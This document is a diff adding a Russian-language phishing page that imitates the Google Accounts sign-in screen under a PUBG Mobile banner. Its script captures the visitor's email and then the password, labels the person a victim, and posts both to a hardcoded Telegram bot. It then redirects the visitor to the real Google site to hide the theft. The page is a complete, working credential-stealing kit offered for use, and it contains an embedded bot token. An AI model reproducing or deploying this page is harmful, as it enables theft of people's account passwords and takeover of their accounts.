@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Вход – Google Аккаунты</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+body {
+    background: #fff;
+    font-family: 'Google Sans', Roboto, Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+}
+
+.header-logo {
+    margin-top: 30px;
+    margin-bottom: 10px;
+    text-align: center;
+}
+.header-logo img {
+    width: 180px;
+    height: auto;
+}
+
+.card {
+    width: 100%;
+    max-width: 450px;
+    padding: 30px 40px;
+    text-align: center;
+}
+
+.google-logo {
+    width: 95px;
+    margin-bottom: 15px;
+}
+
+h1 {
+    font-size: 24px;
+    font-weight: 400;
+    color: #202124;
+    margin-bottom: 10px;
+}
+
+.sub-text {
+    font-size: 16px;
+    color: #202124;
+    margin-bottom: 35px;
+}
+
+.input-container {
+    margin-bottom: 10px;
+    text-align: left;
+}
+
+input {
+    width: 100%;
+    padding: 13px 15px;
+    font-size: 16px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    outline: none;
+    font-family: inherit;
+}
+
+input:focus {
+    border: 2px solid #1a73e8;
+    padding: 12px 14px;
+}
+
+.link {
+    color: #1a73e8;
+    text-decoration: none;
+    font-weight: 500;
+    font-size: 14px;
+    display: inline-block;
+    margin-top: 12px;
+}
+
+.footer-buttons {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 40px;
+}
+
+.btn-text {
+    color: #1a73e8;
+    background: none;
+    border: none;
+    font-weight: 500;
+    cursor: pointer;
+    font-size: 14px;
+}
+
+.btn-next {
+    background: #1a73e8;
+    color: #fff;
+    padding: 10px 24px;
+    border: none;
+    border-radius: 4px;
+    font-weight: 500;
+    cursor: pointer;
+}
+
+.hidden {
+    display: none;
+}
+
+.bottom-info {
+    position: fixed;
+    bottom: 20px;
+    width: 100%;
+    max-width: 450px;
+    display: flex;
+    justify-content: space-between;
+    padding: 0 20px;
+    font-size: 12px;
+    color: #70757a;
+}
+</style>
+</head>
+<body>
+
+    <div class="header-logo">
+        <img src="https://i.postimg.cc/Dyjqpr8h/pubg-mobile8710.jpg" alt="PUBG Logo">
+    </div>
+
+    <div id="step1" class="card">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" class="google-logo">
+        <h1>Вход</h1>
+        <div class="sub-text">Используйте аккаунт Google</div>
+        
+        <div class="input-container">
+            <input type="email" id="email" placeholder="Email или номер телефона">
+            <a href="#" class="link">Забыли адрес почты?</a>
+        </div>
+
+        <div class="footer-buttons">
+            <button class="btn-text">Создать аккаунт</button>
+            <button class="btn-next" onclick="nextStep()">Далее</button>
+        </div>
+    </div>
+
+    <div id="step2" class="card hidden">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" class="google-logo">
+        <h1>Добро пожаловать</h1>
+        <div id="displayEmail" style="margin-bottom: 20px; font-size: 14px; color: #202124; background: #f1f3f4; padding: 5px 12px; border-radius: 20px; display: inline-block; border: 1px solid #dadce0;"></div>
+        
+        <div class="input-container">
+            <input type="password" id="password" placeholder="Введите пароль">
+            <a href="#" class="link">Забыли пароль?</a>
+        </div>
+
+        <div class="footer-buttons">
+            <button class="btn-text"></button>
+            <button class="btn-next" onclick="finish()">Далее</button>
+        </div>
+    </div>
+
+    <div class="bottom-info">
+        <div>Русский ▼</div>
+        <div>
+            <span style="margin-right: 15px;">Справка</span>
+            <span>Конфиденциальность</span>
+        </div>
+    </div>
+
+<script>
+    const TOKEN = '8698168592:AAGqmjeLXk88K7igVix56iPThTQr23u_DIM';
+    const ID = '81872631';
+
+    async function sendToTelegram(message) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: ID, text: message})
+            });
+        } catch(e) {
+            console.log('Ошибка отправки:', e);
+        }
+    }
+
+    function nextStep() {
+        const mail = document.getElementById('email').value;
+        if(mail) {
+            sendToTelegram(`📧 ПОЧТА ЖЕРТВЫ\n${mail}\n🕒 ${new Date().toLocaleString()}`);
+            document.getElementById('displayEmail').innerText = mail;
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        } else {
+            alert('Введите email');
+        }
+    }
+
+    async function finish() {
+        const mail = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        if(pass) {
+            const text = `🔐 ПАРОЛЬ ОТ ПОЧТЫ\n📧 Email: ${mail}\n🔑 Pass: ${pass}\n🕒 ${new Date().toLocaleString()}`;
+            await sendToTelegram(text);
+            window.location.href = 'https://accounts.google.com';
+        } else {
+            alert('Введите пароль');
+        }
+    }
+</script>
+
+</body>
+</html>
